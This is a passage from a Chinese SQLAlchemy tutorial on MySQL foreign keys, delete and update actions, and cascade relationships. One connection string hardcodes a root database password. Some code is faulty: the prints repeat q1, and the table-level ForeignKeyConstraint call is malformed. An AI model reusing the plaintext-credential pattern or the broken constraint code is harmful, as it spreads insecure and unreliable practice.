<span class="token string">'vendors'</span>    v_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    v_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    products <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Products'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'vendors'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Products</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'products'</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    p_price <span class="token operator">=</span> Column<span class="token punctuation">(</span>DECIMAL<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'categoryes.c_id'</span> <span class="token punctuation">,</span>  ondelete<span class="token operator">=</span><span class="token string">'SET NULL'</span><span class="token punctuation">,</span> onupdate<span class="token operator">=</span><span class="token string">'CASCADE'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 外键指定的是表的字段</span>    v_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'vendors.v_id'</span><span class="token punctuation">,</span> ondelete<span class="token operator">=</span><span class="token string">'NO ACTION'</span><span class="token punctuation">,</span> onupdate<span class="token operator">=</span><span class="token string">'CASCADE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    categoryes <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Categoryes'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'products'</span><span class="token punctuation">)</span>    vendors <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Vendors'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'products'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span><span class="token comment" spellcheck="true"># Base.metadata.create_all(engine)</span><span class="token comment" spellcheck="true"># 查询数据</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Categoryes<span class="token punctuation">)</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Vendors<span class="token punctuation">)</span>q3 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Products<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 内连接,类的属性就直接代表了他们的relationship</span>q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Products<span class="token punctuation">.</span>p_id<span class="token punctuation">,</span> Products<span class="token punctuation">.</span>p_name<span class="token punctuation">,</span> Categoryes<span class="token punctuation">.</span>c_name<span class="token punctuation">,</span> Vendors<span class="token punctuation">.</span>v_name<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>and_<span class="token punctuation">(</span>Products<span class="token punctuation">.</span>c_id <span class="token operator">==</span> Categoryes<span class="token punctuation">.</span>c_id<span class="token punctuation">,</span> Products<span class="token punctuation">.</span>v_id <span class="token operator">==</span> Vendors<span class="token punctuation">.</span>v_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q1:'</span><span class="token punctuation">,</span> q1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q2:'</span><span class="token punctuation">,</span> q1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q3:'</span><span class="token punctuation">,</span> q1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q4:'</span><span class="token punctuation">,</span> q1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和<code>MySQL</code>的外键语句相同,<code>on delete action\on update action</code> 如下对应</p><table><thead><tr><th><code>SQLAlchemy</code></th><th><code>MySQL</code></th></tr></thead><tbody><tr><td><code>RESTRICT</code></td><td><code>RESTRICT</code>:默认,不能删除外键连接的数据</td></tr><tr><td><code>NO ACTION</code></td><td><code>NO ACTION</code>: 同<code>RESTRICT</code></td></tr><tr><td><code>CASCADE</code></td><td><code>CASCADE</code>: 级联,做同样的操作</td></tr><tr><td><code>SET NULL</code></td><td><code>SET NULL</code>: 父表删除数据时,子表外键数据设置为<code>NULL</code>(约束不能为<code>not null</code>)</td></tr></tbody></table><p>如果是表级别的外键约束,则可以写成:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> ForeignKeyConstraint<span class="token keyword">class</span> <span class="token class-name">Products</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'products'</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    p_price <span class="token operator">=</span> Column<span class="token punctuation">(</span>DECIMAL<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">)</span>    v_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 表级别的外键约束</span>    ForeignKeyConstraint<span class="token punctuation">(</span>c_id<span class="token punctuation">,</span> ondelete<span class="token operator">=</span><span class="token string">'SET NULL'</span><span class="token punctuation">,</span> onupdate<span class="token operator">=</span><span class="token string">'CASCADE'</span><span class="token punctuation">)</span>    ForeignKeyConstraint<span class="token punctuation">(</span>v_id<span class="token punctuation">,</span> ondelete<span class="token operator">=</span><span class="token string">'NO ACTION'</span><span class="token punctuation">,</span> onupdate<span class="token operator">=</span><span class="token string">'CASCADE'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 双向关系.</span>    categoryes <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Categoryes'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'products'</span><span class="token punctuation">)</span>    vendors <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Vendors'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'products'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>在数据库中插入数据:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 插入数据</span>c1 <span class="token operator">=</span> Categoryes<span class="token punctuation">(</span>c_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> c_name<span class="token operator">=</span><span class="token string">'fruit'</span><span class="token punctuation">,</span> c_description<span class="token operator">=</span><span class="token string">'水果'</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> Categoryes<span class="token punctuation">(</span>c_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> c_name<span class="token operator">=</span><span class="token string">'book'</span><span class="token punctuation">,</span> c_description<span class="token operator">=</span><span class="token string">'书籍'</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> Vendors<span class="token punctuation">(</span>v_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> v_name<span class="token operator">=</span><span class="token string">'USA'</span><span class="token punctuation">)</span>v2 <span class="token operator">=</span> Vendors<span class="token punctuation">(</span>v_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> v_name<span class="token operator">=</span><span class="token string">'China'</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> Products<span class="token punctuation">(</span>p_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> p_name<span class="token operator">=</span><span class="token string">'Apple'</span><span class="token punctuation">,</span> p_price<span class="token operator">=</span><span class="token number">1001.0001</span><span class="token punctuation">,</span>c_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> v_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> Products<span class="token punctuation">(</span>p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> p_name<span class="token operator">=</span><span class="token string">'Banany'</span><span class="token punctuation">,</span> p_price<span class="token operator">=</span><span class="token number">1001.0001</span><span class="token punctuation">,</span>c_id<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> v_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>add_all<span class="token punctuation">(</span><span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">]</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看当前<code>products</code>表</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">+</span><span class="token comment" spellcheck="true">----------+------+------------------------------------------------------------------+</span><span class="token operator">|</span> <span class="token keyword">Table</span>           <span class="token operator">|</span> <span class="token keyword">Create</span> <span class="token keyword">Table</span>                                                     <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----------+------+------------------------------------------------------------------+</span><span class="token operator">|</span> products        <span class="token operator">|</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>products<span class="token punctuation">`</span> <span class="token punctuation">(</span>                                        <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token punctuation">`</span>p_id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>                        <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token punctuation">`</span>p_name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>                                 <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token punctuation">`</span>p_price<span class="token punctuation">`</span> <span class="token keyword">decimal</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>                               <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token punctuation">`</span>c_id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>                                   <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token punctuation">`</span>v_id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>                                   <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>p_id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                          <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">KEY</span> <span class="token punctuation">`</span>c_id<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>c_id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                           <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">KEY</span> <span class="token punctuation">`</span>v_id<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>v_id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                           <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">CONSTRAINT</span> <span class="token punctuation">`</span>products_ibfk_1<span class="token punctuation">`</span> <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>c_id<span class="token punctuation">`</span><span class="token punctuation">)</span>              <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">REFERENCES</span> <span class="token punctuation">`</span>categoryes<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>c_id<span class="token punctuation">`</span><span class="token punctuation">)</span>                               <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">SET</span> <span class="token boolean">NULL</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">,</span>                          <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">CONSTRAINT</span> <span class="token punctuation">`</span>products_ibfk_2<span class="token punctuation">`</span> <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>v_id<span class="token punctuation">`</span><span class="token punctuation">)</span>              <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">REFERENCES</span> <span class="token punctuation">`</span>vendors<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>v_id<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">NO</span> <span class="token keyword">ACTION</span>              <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span>   <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span>                                              <span class="token operator">|</span><span class="token operator">|</span>                 <span class="token operator">|</span> <span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8                             <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----------+-------------------------------------------------------------------------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试在数据库中删除<code>categoryes</code>表中数据，然后查看外键引用变化</p><pre class="line-numbers language-sql"><code class="language-sql">mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">delete</span> <span class="token keyword">from</span> categoryes <span class="token keyword">where</span> c_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> products<span class="token punctuation">;</span>      <span class="token operator">+</span><span class="token comment" spellcheck="true">------+--------+-----------+--------+------+</span><span class="token operator">|</span> p_id <span class="token operator">|</span> p_name <span class="token operator">|</span> p_price   <span class="token operator">|</span> c_id   <span class="token operator">|</span> v_id <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------+--------+-----------+--------+------+</span><span class="token operator">|</span> <span class="token number">1</span>    <span class="token operator">|</span> Apple  <span class="token operator">|</span> <span class="token number">1001.0001</span> <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span> <span class="token operator">|</span> <span class="token number">1</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span> Banany <span class="token operator">|</span> <span class="token number">1001.0001</span> <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span> <span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------+--------+-----------+--------+------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到最后在外键<code>products</code>表中<code>c_id</code>变成了<code>null</code>.</p><p>尝试使用<code>sqlalchemy</code>删除数据</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> q2<span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Vendors<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Vendors<span class="token punctuation">.</span>v_id<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>q2<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>IntegrityError <span class="token punctuation">:</span><span class="token punctuation">(</span>pymysql<span class="token punctuation">.</span>err<span class="token punctuation">.</span>IntegrityError<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">1048</span><span class="token punctuation">,</span> <span class="token string">"Column 'v_id' cannot be null"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>SQL<span class="token punctuation">:</span> UPDATE products SET v_id<span class="token operator">=</span><span class="token operator">%</span><span class="token punctuation">(</span>v_id<span class="token punctuation">)</span>s WHERE products<span class="token punctuation">.</span>p_id <span class="token operator">=</span> <span class="token operator">%</span><span class="token punctuation">(</span>products_p_id<span class="token punctuation">)</span>s<span class="token punctuation">]</span><span class="token punctuation">[</span>parameters<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'v_id'</span><span class="token punctuation">:</span> None<span class="token punctuation">,</span> <span class="token string">'products_p_id'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它会产生一个<code>IntegrityError</code> .这是由于没有设置<code>relationship</code>中的级联模式.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span>Integer<span class="token punctuation">,</span>Text<span class="token punctuation">,</span>DECIMAL<span class="token punctuation">,</span>String<span class="token punctuation">,</span>ForeignKey<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> relationship<span class="token comment" spellcheck="true"># 1.创建连接</span>connect_msg <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101/test'</span>engine<span class="token operator">=</span>create_engine<span class="token punctuation">(</span>connect_msg<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 实例化 Session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建 Model</span><span class="token keyword">class</span> <span class="token class-name">Categoryes</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     __tablename__ <span class="token operator">=</span> <span class="token string">'categoryes'</span>     c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>     c_description <span class="token operator">=</span> Column<span class="token punctuation">(</span>Text<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 设置双向关系 指定的是 类方法</span>     products <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Products'</span><span class="token punctuation">,</span>  back_populates<span class="token operator">=</span><span class="token string">'categoryes'</span><span class="token punctuation">,</span>cascade<span class="token operator">=</span><span class="token string">'all, delete-orphan'</span><span class="token punctuation">,</span>single_parent<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Products</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     __tablename__ <span class="token operator">=</span> <span class="token string">'products'</span>     p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>     p_price <span class="token operator">=</span> Column<span class="token punctuation">(</span>DECIMAL<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 外键连接的是 表.字段</span>     c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'categoryes.c_id'</span><span class="token punctuation">,</span> ondelete<span class="token operator">=</span><span class="token string">'SET NULL'</span><span class="token punctuation">,</span> onupdate<span class="token operator">=</span><span class="token string">'CASCADE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     v_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'vendors.v_id'</span><span class="token punctuation">,</span> ondelete<span class="token operator">=</span><span class="token string">'NO ACTION'</span><span class="token punctuation">,</span> onupdate<span class="token operator">=</span><span class="token string">'CASCADE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     categoryes <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Categoryes'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'products'</span><span class="token punctuation">,</span>cascade<span class="token operator">=</span><span class="token string">'all, delete-orphan'</span><span class="token punctuation">,</span>single_parent<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     vendors <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Vendors'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'products'</span><span class="token punctuation">,</span> cascade<span class="token operator">=</span><span class="token string">'all, delete-orphan'</span><span class="token punctuation">,</span>single_parent<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Vendors</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     __tablename__ <span class="token operator">=</span> <span class="token string">'vendors'</span>     v_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     v_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     products <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Products'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'vendors'</span><span class="token punctuation">,</span>cascade<span class="token operator">=</span><span class="token string">'all, delete-orphan'</span><span class="token punctuation">,</span>single_parent<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 尝试删除 级联模式的 外键数据</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Vendors<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上删除成功,因为这里是多对多的关系,必须使用参数<code>single-parent=True</code> ,<a href="https://docs.sqlalchemy.org/en/13/orm/relationship_api.html?highlight=relationship#sqlalchemy.orm.relationship.params.single_parent" target="_blank" rel="noopener">参照</a>,如果设置为True,就会放置对象一次与多个父对象关联.多用于一对多,多对多关系中.</p></blockquote><h3 id="11-基本关系模式"><a href="#11-基本关系模式" class="headerlink" title="11.基本关系模式"></a>11.基本关系模式</h3><blockquote><p>基本的关系模式包括(基于外键的<code>FOREIGN_KEY</code>)来实现.包含如下：</p><ul><li>一对一</li><li>一对多</li><li>多对多</li></ul></blockquote><h4 id="1-一对多"><a href="#1-一对多" 